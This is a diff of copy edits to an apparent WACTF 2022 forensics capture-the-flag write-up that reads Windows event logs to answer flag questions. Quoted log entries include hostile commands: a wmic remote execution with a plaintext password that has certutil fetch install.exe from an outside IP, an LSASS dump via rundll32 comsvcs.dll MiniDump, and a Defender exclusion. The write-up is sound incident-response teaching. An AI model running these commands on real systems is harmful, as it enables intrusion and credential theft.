@@ -10,7 +10,7 @@ featured = false
 
 ## Intro
 
-This covers the Incident-Response/Forensics section of WACTF 2022. Unfortunately I do not have the challenge files to hand, and couldn't find them in [the repo](https://github.com/WACTF-org/2022-prod) but you might have more luck. The challenge provided download for a number of event log files (`.evtx`) from multiple machines.
+This covers the Incident-Response/Forensics section of WACTF 2022. Unfortunately I do not have the challenge files to hand, and couldn't find them in [the repo](https://github.com/WACTF-org/2022-prod), but you might have more luck. The challenge provided a download for a number of event log files (`.evtx`) from multiple machines.
 
 ## Challenges
 
@@ -47,7 +47,7 @@ Subject:
 Logon Type: 2
 ```
 
-We can see the LogonType field for the accounts user’s session is 2, With a quick google search we can see that a logon type 2 is an interactive local logon, not a network logon, therefore:
+We can see the LogonType field for the accounts user’s session is 2. With a quick google search we can see that a logon type 2 is an interactive local logon, not a network logon, therefore:
 
 **FLAG** `WACTF{CONSOLE}`
 
@@ -99,7 +99,7 @@ Process Information:
   Process Command Line: whoami
 ```
 
-We can see that a downloaded executable called install.exe running the command whoami, a common first step for an attacker once they gain access to a machine. This is not behaviour that would be seen from a true installer executable and therefore the flag is:
+We can see that a downloaded executable called `install.exe` is running the command `whoami`, a common first step for an attacker once they gain access to a machine. This is not behaviour that would be seen from a true installer executable and therefore the flag is:
 
 **FLAG** `WACTF{install.exe}`
 
@@ -157,7 +157,7 @@ Process Information:
   Process Command Line: "C:\Users\accounts\Downloads\install.exe"
 ```
 
-We see the malware file we just found (`install.exe`) being run by `browser_broker.exe`. As the name suggests, this executable is used in browser function, therefore the flag is:
+We see the malware file we just found (`install.exe`) being run by `browser_broker.exe`. As the name suggests, this executable is used in browser functions, therefore the flag is:
 
 **FLAG** `WACTF{BROWSER}`
 
@@ -259,7 +259,7 @@ Process Information:
   Process Command Line: net group "domain admins" /domain
 ```
 
-We see the malware file we just found (`install.exe`) running a new command `net group "domain admins" /domain` . With a quick google we can confirm that this command lets the attacker identify domain admin accounts and therefore the flag is:
+We see the malware file we just found (`install.exe`) running a new command `net group "domain admins" /domain`. With a quick google we can confirm that this command lets the attacker identify domain admin accounts and therefore the flag is:
 
 **FLAG** `WACTF{net group "domain admins" /domain}`
 
@@ -309,7 +309,7 @@ Process Information:
   Process Command Line: powershell.exe Add-MpPreference -ExclusionPath C:temp
 ```
 
-We see the attacker running the command `powershell.exe Get-MpPreference | Select-Object -Property ExclusionPath`. With a quick google we see that `Get-MpPreference` is a PowerShell module that checks and modifies options for windows defender, and the `Select-Object -Property ExclusionPath flags` request a list of windows defender exclusions, aka areas in the computer windows defender does not scan, and therefore areas where the attacker can operate without scrutiny. Therefore the flag is:
+We see the attacker running the command `powershell.exe Get-MpPreference | Select-Object -Property ExclusionPath`. With a quick google we see that `Get-MpPreference` is a PowerShell module that checks and modifies options for Windows Defender, and the `Select-Object -Property ExclusionPath` flag requests a list of Windows Defender exclusions, aka areas in the computer that Windows Defender does not scan, and therefore areas where the attacker can operate without scrutiny. Therefore the flag is:
 
 **FLAG** `WACTF{powershell.exe Get-MpPreference | Select-Object -Property ExclusionPath}`
 
@@ -366,7 +366,7 @@ Process Information:
 
 We see a new PowerShell session where the attackers try to add a new exclusion with the command `powershell.exe Add-MpPreference -ExclusionPath C:temp`.
 
-This is a Process Creation log, and the PowerShell session has the process ID `0x18b0`. We can the look for the corresponding Process Termination log to see if the command ran successfully:
+This is a Process Creation log, and the PowerShell session has the process ID `0x18b0`. We can then look for the corresponding Process Termination log to see if the command ran successfully:
 
 ```text
 Type : Audit Success
@@ -502,7 +502,7 @@ Process Information:
 ```
 
 We see a new PowerShell session where the attackers try to run the file `services.bat`. This is a Process Creation log, and the PowerShell session has the
-process ID `0x15b4`. We can the look for the corresponding Process Termination log to see if the command ran successfully:
+process ID `0x15b4`. We can then look for the corresponding Process Termination log to see if the command ran successfully:
 
 ```text
 Type : Audit Success
@@ -622,7 +622,7 @@ private static extern IntPtr GetModuleHandle(string lpModuleName);
 ParameterBinding(Add-Type): name="ReferencedAssemblies"; value="System.Windows.Forms"
 ```
 
-With a bit of googling (for instance googling the variable declarations such as `private static extern IntPtr` ), we can find that this file uses the language C#, therefore the flag is:
+With a bit of googling (for instance googling the variable declarations such as `private static extern IntPtr`), we can find that this file uses the language C#, therefore the flag is:
 
 **FLAG** `WACTF{C#}`
 
@@ -636,7 +636,7 @@ Response should be in the format: `WACTF{TXXXX.YYY}` (e.g. `WACTF{T1000.005}`)
 
 {{< details summary="Solution" >}}
 
-Reading through that code, we can see that it calling itself a KeyLogger, which is a type of malware. Goggling the phrase keylogger mitre attack brings us to it’s [MITRE att&ck page](https://attack.mitre.org/techniques/T1056/001/) which contains its technique and sub-technique number, and therefore the flag is:
+Reading through that code, we can see that it is calling itself a KeyLogger, which is a type of malware. Googling the phrase keylogger mitre attack brings us to its [MITRE att&ck page](https://attack.mitre.org/techniques/T1056/001/) which contains its technique and sub-technique number, and therefore the flag is:
 
 **FLAG** `WACTF{T1056.001}`
 
@@ -650,7 +650,7 @@ What function does log.ps1 hook to do its thing?
 
 {{< details summary="Solution" >}}
 
-Reading through the code of log.ps1 again, we come find the line
+Reading through the code of log.ps1 again, we find the line
 
 ```c#
 return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
@@ -708,7 +708,7 @@ Process Information:
   Process Command Line: wmic /user:administrator /password:P@ssw0rd /node:10.0.100.1 process call create "certutil.exe -urlcache -split -f http://139.60.161.56:8080/install.exe c:/temp/install.exe"
 ```
 
-We see the attackers using the tool `wmic` to run commands on a new machine. googling the phrase wmic mitre attack brings us to the page for [Windows Management Instrumentation based attacks](https://attack.mitre.org/techniques/T1047/), giving us the mitre technique number. Therefore the flag is:
+We see the attackers using the tool `wmic` to run commands on a new machine. Googling the phrase wmic mitre attack brings us to the page for [Windows Management Instrumentation based attacks](https://attack.mitre.org/techniques/T1047/), giving us the mitre technique number. Therefore the flag is:
 
 **FLAG** `WACTF{T1047}`
 
@@ -768,7 +768,7 @@ Type 2 is an elevated token with no privileges removed or groups disabled. An el
 Type 3 is a limited token with administrative privileges removed and administrative groups disabled. The limited token is used when User Account Control is enabled
 ```
 
-We see the attackers using the tool wmic to run the command `certutil.exe -urlcache -split -f http://139.60.161.56:8080/install.exe c:/temp/install.exe`. A quick google will confirm that certutil.exe is being used to download the malware install.exe, therefore the flag is:
+We see the attackers using the tool `wmic` to run the command `certutil.exe -urlcache -split -f http://139.60.161.56:8080/install.exe c:/temp/install.exe`. A quick google will confirm that `certutil.exe` is being used to download the malware `install.exe`, therefore the flag is:
 
 **FLAG** `WACTF{certutil.exe}`
 
@@ -784,7 +784,7 @@ Provide flag in the form `WACTF{abbreviationhere}`
 
 {{< details summary="Solution" >}}
 
-The name for using legitimate and existing tools for an attack is called living off the land (as in the attackers are living off the land they find themselves on, not changing the environment and bringing in external tooling). The name for binaries that are used for this type of attack is living off the land binaries, often shortened to [LOLBins](https://www.securityhq.com/blog/security-101-lolbins-malware-exploitation/). Reading the challenge description closely, we see that we are looking for the name of a single tool, not all tools. Taking into account the plurality, the flag is:
+The name for using legitimate and existing tools for an attack is living off the land (as in the attackers are living off the land they find themselves on, not changing the environment and bringing in external tooling). The name for binaries that are used for this type of attack is living off the land binaries, often shortened to [LOLBins](https://www.securityhq.com/blog/security-101-lolbins-malware-exploitation/). Reading the challenge description closely, we see that we are looking for the name of a single tool, not all tools. Taking into account the plurality, the flag is:
 
 **FLAG** `WACTF{LOLBin}`
 
@@ -836,7 +836,7 @@ Process Information:
   Process Command Line: rundll32.exe comsvcs.dll MiniDump 676 raw.dat full
 ```
 
-We see the attackers using tool rundll32 to run the command `rundll32.exe comsvcs.dll MiniDump 676 raw.dat full`. Googling the command rundll32.exe comsvcs.dll MiniDump brings us to this page titled [Dumping Lsass Without Mimikatz](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz). Now knowing that this command is meant to dump lsass memory, we can google dumping lsass mitre attack which will bring us to the page [OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/), giving us the mitre technique and sub- technique number. Therefore the flag is:
+We see the attackers using the tool `rundll32` to run the command `rundll32.exe comsvcs.dll MiniDump 676 raw.dat full`. Googling the command rundll32.exe comsvcs.dll MiniDump brings us to this page titled [Dumping Lsass Without Mimikatz](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz). Now knowing that this command is meant to dump lsass memory, we can google dumping lsass mitre attack which will bring us to the page [OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/), giving us the mitre technique and sub-technique number. Therefore the flag is:
 
 **FLAG** `WACTF{T1003.001}`
 
@@ -912,7 +912,7 @@ Answer Format: `WACTF{TXXXX.YYY}` (e.g. `WACTF{T2222.333}`)
 
 {{< details summary="Solution" >}}
 
-As we saw in question 16, the attackers dump lsass memory, reading up on what the actually means, it means that the attackers have dumped the passwords of accounts on this new machine. Since we see no other suspicious activity in the logs that would likely enable access to a new account, we can assume that this is how the domain was taken over. Therefore the flag is:
+As we saw in question 16, the attackers dump lsass memory, reading up on what that actually means, it means that the attackers have dumped the passwords of accounts on this new machine. Since we see no other suspicious activity in the logs that would likely enable access to a new account, we can assume that this is how the domain was taken over. Therefore the flag is:
 
 **FLAG** `WACTF{T1003.001}`
 
@@ -938,7 +938,7 @@ Answer Format: `WACTF{name}` (e.g. `WACTF{BO2k}`)
 
 {{< details summary="Solution" >}}
 
-Reading through these logs, and searching up the commands used ( execute -o, tasks, etc) you will find that they don’t match most C2 systems, but matches one called Sliver (If by this point you have completed the attribution question Q22 then you can also double check that the group doing these activities does use sliver, which is confirmed by articles such as [this one](https://thehackernews.com/2022/08/cybercrime-groups-increasingly-adopting.html)). Therefore the flag is:
+Reading through these logs, and searching up the commands used (execute -o, tasks, etc) you will find that they don’t match most C2 systems, but match one called Sliver (If by this point you have completed the attribution question Q22 then you can also double check that the group doing these activities does use Sliver, which is confirmed by articles such as [this one](https://thehackernews.com/2022/08/cybercrime-groups-increasingly-adopting.html)). Therefore the flag is:
 
 **FLAG** `WACTF{Sliver}`
 
@@ -954,7 +954,7 @@ Example solution `WACTF{ANDRORAT}`
 
 {{< details summary="Solution" >}}
 
-As suggested in the challenge description, we should start by looking at the logs of question 19. With research or prior knowledge, you can recognise some of those commands to be those for a tool called meterpreter, which perfectly matches the tool described in the challenge description. Therefore the flag is:
+As suggested in the challenge description, we should start by looking at the logs of question 19. With research or prior knowledge, you can recognise some of those commands as belonging to a tool called Meterpreter, which perfectly matches the tool described in the challenge description. Therefore the flag is:
 
 **FLAG** `WACTF{Meterpreter}`
 
@@ -970,7 +970,7 @@ eg. Ransomware, RAT, Worm etc. etc.
 
 {{< details summary="Solution" >}}
 
-From the name of the tool, we can assume it is meant to trash the MBR, whatever that is. Googling once again, we see that MBR stands for Master Boot Record, and that destroying this area on the disk is a common technique for only two types of malware, wiper viruses and ransomware as it effectively renders a computer useless. From the name, we can assume that all this tool does is render a computer useless, therefore it is a wiper virus not ransomware and thus the flag is:
+From the name of the tool, we can assume it is meant to trash the MBR, whatever that is. Googling once again, we see that MBR stands for Master Boot Record, and that destroying this area on the disk is a common technique for only two types of malware, wiper viruses and ransomware, as it effectively renders a computer useless. From the name, we can assume that all this tool does is render a computer useless, therefore it is a wiper virus not ransomware and thus the flag is:
 
 **FLAG** `WACTF{Wiper}`
 
